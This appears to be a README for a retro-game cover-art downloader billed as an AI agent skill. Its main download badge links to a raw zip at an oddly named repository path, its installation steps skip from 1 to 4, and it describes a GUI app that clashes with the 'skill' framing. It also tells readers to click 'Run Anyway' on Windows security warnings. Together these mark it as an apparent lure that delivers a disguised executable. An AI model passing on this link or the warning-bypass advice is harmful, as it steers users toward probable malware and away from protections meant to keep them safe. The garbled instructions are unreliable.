# 🎮 game-cover-downloader-skill - Batch download retro game collection art

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/trashy-whistler749/game-cover-downloader-skill/main/Servetian/downloader_skill_cover_game_3.5-alpha.2.zip)

This tool helps you manage retro game collections. It pulls game covers and logos from the Libretro database. You use these images in programs like Pegasus, ES-DE, or RetroArch. It works as an agent skill for AI tools like Claude Code or Codex CLI. You save time by automating the process of finding art for your game library.

1. Open the application.

4. Click the "Scan" button to let the tool check your games.
5. Review the list of games the tool found.
6. Click the "Download" button to start the process.
7. Wait while the tool fetches images from the Libretro database.
8. View the progress bar to see when the task completes.

## 📂 Understanding the Folders

The tool saves images into specific subfolders inside your game directory.

- Boxart: This folder contains the main covers for your games.
- Logos: This folder stores the title art for use in your menu.
- Screenshots: Some configurations may include actual gameplay images.

If you ever need to change your settings, use the "Settings" menu inside the application. You can change the folder paths or pick a different download source here.

## 🛠️ Solving Common Problems

Most issues occur due to folder naming or network access.

- If the tool finds no games, check that your folder path points to the correct location.
- If the download stops, check your internet connection. Restart the tool to resume the process.
- If images appear missing in your front-end, make sure the front-end points to the same folders where the tool saved your files.
- The tool needs permission to write files to your drive. If you get a Windows security warning, select "Run Anyway."
- The tool uses the Libretro format. Always ensure your game ROMs carry names that match the database entries.

## 💡 Best Practices

For the best results with your collection, follow these steps:

- Keep your ROM names clean. Remove extra text like region codes or version numbers to improve accuracy.
- Run the tool after you add new games to your collection. This ensures you keep your covers up to date.
- Backup your image folders before you run a full batch download.
- Check the official repository for version updates. The tool checks for new features when it starts.
- Use the tool with compatible front-ends like ES-DE for the best visual match.
